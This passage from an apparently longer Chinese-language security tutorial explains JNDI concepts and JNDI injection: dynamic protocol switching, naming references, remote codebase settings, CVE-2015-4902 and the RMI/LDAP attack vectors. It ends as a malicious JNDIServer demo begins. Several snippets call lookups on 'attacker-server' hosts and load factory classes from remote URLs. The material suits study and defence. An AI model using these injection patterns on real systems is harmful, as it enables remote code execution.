  6. Weblogic RMI正常调用触发反序列化以及模拟T3协议触发反序列化都可以，但是模拟T3协议传输简化了很多过程。
Weblogic
RMI反序列化漏洞起源是CVE-2015-4852，这是@breenmachine最开始发现的，在他的[这篇分享中](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/#background)[7]，不仅讲到了Weblogic的反序列化漏洞的发现，还有WebSphere、JBoss、Jenkins、OpenNMS反序列化漏洞的发现过程以及如何开发利用程序，如果之前没有看过这篇文章，可以耐心的读一下，可以看到作者是如何快速确认是否存在易受攻击的库，如何从流量中寻找反序列化特征，如何去触发这些流量。
我们可以看到作者发现这几个漏洞的过程都有相似性：首先判断了是否存在易受攻击的库/易受攻击的特征->搜集端口信息->针对性的触发流量->在流量中寻找反序列化特征->开发利用程序。不过这是建立在作者对这些Web应用或中间件的整体有一定的了解。
### JNDI
JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory
Service。JNDI是Java
API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。
**Naming Service**
：命名服务是将名称与值相关联的实体，称为"绑定"。它提供了一种使用"find"或"search"操作来根据名称查找对象的便捷方式。
就像DNS一样，通过命名服务器提供服务，大部分的J2EE服务器都含有命名服务器 。例如上面说到的RMI Registry就是使用的Naming
Service。
**Directory Service** ：是一种特殊的Naming
Service，它允许存储和搜索"目录对象"，一个目录对象不同于一个通用对象，目录对象可以与属性关联，因此，目录服务提供了对象属性进行操作功能的扩展。一个目录是由相关联的目录对象组成的系统，一个目录类似于数据库，不过它们通常以类似树的分层结构进行组织。可以简单理解成它是一种简化的RDBMS系统，通过目录具有的属性保存一些简单的信息。下面说到的LDAP就是目录服务。
**几个重要的JNDI概念** ：
  * **原子名** 是一个简单、基本、不可分割的组成部分
  * **绑定** 是名称与对象的关联，每个绑定都有一个不同的原子名
  * **复合名** 包含零个或多个原子名，即由多个绑定组成
  * **上下文** 是包含零个或多个绑定的对象，每个绑定都有一个不同的原子名
  * 命名系统是一组关联的上下文
  * 名称空间是命名系统中包含的所有名称
  * 探索名称空间的起点称为初始上下文
  * 要获取初始上下文，需要使用初始上下文工厂
**使用JNDI的好处** ：
JNDI自身并不区分客户端和服务器端，也不具备远程能力，但是被其协同的一些其他应用一般都具备远程能力，JNDI在客户端和服务器端都能够进行一些工作，客户端上主要是进行各种访问，查询，搜索，而服务器端主要进行的是帮助管理配置，也就是各种bind。比如在RMI服务器端上可以不直接使用Registry进行bind，而使用JNDI统一管理，当然JNDI底层应该还是调用的Registry的bind，但好处JNDI提供的是统一的配置接口；在客户端也可以直接通过类似URL的形式来访问目标服务，可以看后面提到的
**JNDI动态协议转换** 。把RMI换成其他的例如LDAP、CORBA等也是同样的道理。
#### 几个简单的JNDI示例
JNDI与RMI配合使用：
    Hashtable env = new Hashtable();
    env.put(Context.INITIAL_CONTEXT_FACTORY,
            "com.sun.jndi.rmi.registry.RegistryContextFactory");
    env.put(Context.PROVIDER_URL,
            "rmi://localhost:9999");
    Context ctx = new InitialContext(env);
    //将名称refObj与一个对象绑定，这里底层也是调用的rmi的registry去绑定
    ctx.bind("refObj", new RefObject());
    //通过名称查找对象
    ctx.lookup("refObj");
JNDI与LDAP配合使用：
    Hashtable env = new Hashtable();
    env.put(Context.INITIAL_CONTEXT_FACTORY,
     "com.sun.jndi.ldap.LdapCtxFactory");
    env.put(Context.PROVIDER_URL, "ldap://localhost:1389");
    DirContext ctx = new InitialDirContext(env);
    //通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称cn=foo,dc=test,dc=org绑定了
    Object local_obj = ctx.lookup("cn=foo,dc=test,dc=org");
#### JNDI动态协议转换
上面的两个例子都手动设置了对应服务的工厂以及对应服务的PROVIDER_URL，但是JNDI是能够进行动态协议转换的。
例如：
    Context ctx = new InitialContext();
    ctx.lookup("rmi://attacker-server/refObj");
    //ctx.lookup("ldap://attacker-server/cn=bar,dc=test,dc=org");
    //ctx.lookup("iiop://attacker-server/bar");
上面没有设置对应服务的工厂以及PROVIDER_URL，JNDI根据传递的URL协议自动转换与设置了对应的工厂与PROVIDER_URL。
再如下面的：
    Hashtable env = new Hashtable();
    env.put(Context.INITIAL_CONTEXT_FACTORY,
            "com.sun.jndi.rmi.registry.RegistryContextFactory");
    env.put(Context.PROVIDER_URL,
            "rmi://localhost:9999");
    Context ctx = new InitialContext(env);
    String name = "ldap://attacker-server/cn=bar,dc=test,dc=org";
    //通过名称查找对象
    ctx.lookup(name);
即使服务端提前设置了工厂与PROVIDER_URL也不要紧，如果在lookup时参数能够被攻击者控制，同样会根据攻击者提供的URL进行动态转换。
在使用lookup方法时，会进入getURLOrDefaultInitCtx这个方法，转换就在这里面：
    public Object lookup(String name) throws NamingException {
        return getURLOrDefaultInitCtx(name).lookup(name);
    }
    protected Context getURLOrDefaultInitCtx(String name) 
    throws NamingException {
    if (NamingManager.hasInitialContextFactoryBuilder()) {//这里不是说我们设置了上下文环境变量就会进入，因为我们没有执行初始化上下文工厂的构建，所以上面那两种情况在这里都不会进入
        return getDefaultInitCtx();
    }
    String scheme = getURLScheme(name);//尝试从名称解析URL中的协议
    if (scheme != null) {
        Context ctx = NamingManager.getURLContext(scheme, myProps);//如果解析出了Schema协议，则尝试获取其对应的上下文环境
        if (ctx != null) {
       return ctx;
        }
    }
    return getDefaultInitCtx();
       }
#### JNDI命名引用
为了在命名或目录服务中绑定Java对象，可以使用Java序列化传输对象，例如上面示例的第一个例子，将一个对象绑定到了远程服务器，就是通过反序列化将对象传输过去的。但是，并非总是通过序列化去绑定对象，因为它可能太大或不合适。为了满足这些需求，JNDI定义了命名引用，以便对象可以通过绑定由命名管理器解码并解析为原始对象的一个引用间接地存储在命名或目录服务中。
引用由Reference类表示，并且由地址和有关被引用对象的类信息组成，每个地址都包含有关如何构造对象。
Reference可以使用工厂来构造对象。当使用lookup查找对象时，Reference将使用工厂提供的工厂类加载地址来加载工厂类，工厂类将构造出需要的对象：
    Reference reference = new Reference("MyClass","MyClass",FactoryURL);
    ReferenceWrapper wrapper = new ReferenceWrapper(reference);
    ctx.bind("Foo", wrapper);
还有其他从引用构造对象的方式，但是使用工厂的话，因为为了构造对象，需要先从远程获取工厂类 并在目标系统中工厂类被加载。
#### 远程代码库和安全管理器
在JNDI栈中，不是所有的组件都被同等对待。当验证从何处加载远程类时JVM的行为不同。从远程加载类有两个不同的级别：
  * 命名管理器级别
  * 服务提供者接口（SPI）级别
JNDI体系结构：
在SPI级别，JVM将允许从远程代码库加载类并实施安全性。管理器的安装取决于特定的提供程序（例如在上面说到的RMI那些利用方式就是SPI级别，必须设置安全管理器）：
Provider | Property to enable remote class loading | 是否需要强制安装Security Manager  
---|---|---  
RMI | java.rmi.server.useCodebaseOnly = false ( **JDK 6u45、JDK 7u21之后默认为true**
) | 需要  
LDAP | com.sun.jndi.ldap.object.trustURLCodebase = true（default = false） | 非必须  
CORBA |  | 需要  
但是，在Naming
Manager层放宽了安全控制。解码JNDI命名时始终允许引用从远程代码库加载类，而没有JVM选项可以禁用它，并且不需要强制安装任何安全管理器，例如上面说到的命名引用那种方式。
#### JNDI注入起源
**JNDI注入** 是BlackHat
2016（USA）[@pentester](https://twitter.com/pwntester)的一个议题"[A Journey From JNDI
LDAP Manipulation To
RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)"[9]提出的。
有了上面几个知识，现在来看下JNDI注入的起源就容易理解些了。JNDI注入最开始起源于野外发现的Java Applets
点击播放绕过漏洞（CVE-2015-4902），它的攻击过程可以简单概括为以下几步：
  1. 恶意applet使用JNLP实例化JNDI InitialContext
  2. javax.naming.InitialContext的构造函数将请求应用程序的JNDI.properties JNDI配置文件来自恶意网站
  3. 恶意Web服务器将JNDI.properties发送到客户端 JNDI.properties内容为：java.naming.provider.url = rmi://attacker-server/Go
  4. 在InitialContext初始化期间查找rmi//attacker-server/Go，攻击者控制的注册表将返回JNDI引用 （javax.naming.Reference）
  5. 服务器从RMI注册表接收到JNDI引用后，它将从攻击者控制的服务器获取工厂类，然后实例化工厂以返回 JNDI所引用的对象的新实例
  6. 由于攻击者控制了工厂类，因此他可以轻松返回带有静态变量的类初始化程序，运行由攻击者定义的任何Java代码，实现远程代码执行
相同的原理也可以应用于Web应用中。对于 **JNDI注入** ，有以下两个点需要注意：
  1. 仅由InitialContext或其子类初始化的Context对象（InitialDirContext或InitialLdapContext）容易受到JNDI注入攻击
  2. 一些InitialContext属性可以被传递给查找的地址/名称覆盖，即上面提到的JNDI动态协议转换
不仅仅是`InitialContext.lookup()`方法会受到影响，其他方法例如`InitialContext.rename()`、
`InitialContext.lookupLink()`最后也调用了`InitialContext.lookup()`。还有其他包装了JNDI的应用，例如Apache's
Shiro JndiTemplate、Spring's JndiTemplate也会调用`InitialContext.lookup()`，看下Apache
Shiro的JndiTemplate.lookup()：
#### JNDI攻击向量
JNDI主要有以下几种攻击向量：
  * RMI
  * JNDI Reference
  * Remote Object（有安全管理器的限制，在上面RMI利用部分也能看到）
  * LDAP
  * Serialized Object
  * JNDI Reference
  * Remote Location
  * CORBA
  * IOR
有关CORBA的内容可以看BlackHat 2016那个议题相关部分，后面主要说明是RMI攻击向量与LDAP攻击向量。
##### JNDI Reference+RMI攻击向量
使用RMI Remote Object的方式在RMI那一节我们能够看到，利用限制很大。但是使用RMI+JNDI
Reference就没有那些限制，不过在JDK 6u132、JDK 7u122、JDK 8u113 之后，系统属性
`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`
的默认值变为false，即默认不允许RMI、cosnaming从远程的Codebase加载Reference工厂类。
如果远程获取到RMI服务上的对象为 Reference类或者其子类，则在客户端获取远程对象存根实例时，可以从其他服务器上加载 class
文件来进行实例化获取Stub对象。
Reference中几个比较关键的属性：
  1. className - 远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载
  2. classFactory - 远程的工厂类
  3. classFactoryLocation - 工厂类加载的地址，可以是file://、ftp://、http:// 等协议
使用ReferenceWrapper类对Reference类或其子类对象进行远程包装使其能够被远程访问，客户端可以访问该引用。
    Reference refObj = new Reference("refClassName", "FactoryClassName", "http://example.com:12345/");//refClassName为类名加上包名，FactoryClassName为工厂类名并且包含工厂类的包名
    ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
    registry.bind("refObj", refObjWrapper);//这里也可以使用JNDI的ctx.bind("Foo", wrapper)方式，都可以
当有客户端通过 `lookup("refObj")` 获取远程对象时，获得到一个 Reference 类的存根，由于获取的是一个
Reference类的实例，客户端会首先去本地的 `CLASSPATH` 去寻找被标识为 `refClassName` 的类，如果本地未找到，则会去请求
`http://example.com:12345/FactoryClassName.class` 加载工厂类。
这个攻击过程如下：
  1. 攻击者为易受攻击的JNDI的lookup方法提供了绝对的RMI URL
  2. 服务器连接到受攻击者控制的RMI注册表，该注册表将返回恶意JNDI引用
  3. 服务器解码JNDI引用
  4. 服务器从攻击者控制的服务器获取Factory类
  5. 服务器实例化Factory类
  6. 有效载荷得到执行
来模拟下这个过程（以下代码在JDK 1.8.0_102上测试通过）：
恶意的JNDIServer，
    package com.longofo.jndi;
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import javax.naming.NamingException;